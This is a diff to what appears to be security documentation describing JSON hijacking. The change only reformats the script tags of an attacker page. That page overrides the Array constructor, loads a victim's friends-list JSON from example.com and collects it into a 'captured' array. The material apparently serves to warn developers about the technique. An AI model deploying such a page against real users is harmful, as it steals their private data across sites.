@@ -141,7 +141,7 @@ and social engineers a victim to visiting his site:
 
 .. sourcecode:: html
 
-    <script type=text/javascript>
+    <script>
     var captured = [];
     var oldArray = Array;
     function Array() {
@@ -153,9 +153,10 @@ and social engineers a victim to visiting his site:
       capture();
     }
     </script>
-    <script type=text/javascript
-      src=http://example.com/api/get_friends.json></script>
-    <script type=text/javascript>
+
+    <script src="http://example.com/api/get_friends.json"></script>
+
+    <script>
     Array = oldArray;
     // now we have all the data in the captured array.
     </script>
